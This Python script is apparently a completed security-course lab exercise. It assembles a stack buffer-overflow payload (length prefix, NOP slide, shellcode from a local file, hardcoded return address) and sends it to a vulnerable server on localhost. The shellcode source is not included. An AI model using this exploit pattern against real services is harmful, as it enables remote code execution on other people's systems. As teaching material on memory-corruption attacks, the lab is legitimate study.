#!/usr/bin/python

import os, socket, struct, assemble


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    ass = assemble.assemble_file(PATH_TO_SHELLCODE)
    return ass


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''
    # TODO: IMPLEMENT THIS FUNCTION
    desired_shell_length = 1040 # as explained in q1
    nop = '\x90'
    address_to_return = "\xb0\xdf\xff\xbf" # this is the address in the middle of the NOPs slide
    shellcode = get_shellcode() # get our pure shellcode logic
    shellcode_length = len(shellcode) 

    # full structe - slide NOPs, shellcode, address to return
    message = nop * (desired_shell_length - shellcode_length) + shellcode + address_to_return
    message_length = len(message)
    message_length_newtork_order = struct.pack('>L', message_length) # add size as in q1

    return message_length_newtork_order + message # return payoload - message + size


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
